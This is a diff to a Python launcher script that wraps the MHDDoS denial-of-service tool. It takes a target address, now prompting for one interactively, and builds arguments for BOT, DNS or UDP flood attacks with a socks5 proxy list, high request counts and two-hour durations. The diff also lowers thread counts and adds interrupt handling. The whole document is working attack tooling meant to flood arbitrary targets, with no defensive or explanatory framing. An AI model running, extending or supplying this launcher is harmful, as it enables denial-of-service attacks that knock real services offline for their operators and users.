@@ -1,12 +1,16 @@
 import sys
 from sys import argv
+
 from MHDDoS.start import start, ToolsConsole
 
 
 def kara():
     if len(argv) < 2:
-        print("Please enter target address.")
-        sys.exit(1)
+        address = input("Enter target address: ")
+        if not address:
+            print("Target not specified, aborting execution.")
+            sys.exit(1)
+        argv.insert(1, address)
     address = argv[1]
 
     port = None
@@ -30,7 +34,7 @@ def kara():
         argv[1] = "BOT"
         argv.insert(2, address)
         argv.insert(3, "5")
-        argv.insert(4, "1000")
+        argv.insert(4, "100")
         argv.insert(5, "socks5.txt")
         argv.insert(6, "1000000000")
         argv.insert(7, "7200")
@@ -38,11 +42,14 @@ def kara():
         # Prepare IP attack arguments
         argv[1] = "DNS" if port == 53 else "UDP"
         argv.insert(2, f"{address}:{port}")
-        argv.insert(3, "1000")
+        argv.insert(3, "100")
         argv.insert(4, "1000000000")
 
     start()
 
 
 if __name__ == '__main__':
-    kara()
+    try:
+        kara()
+    except KeyboardInterrupt:
+        print("\nExecution aborted.\n")
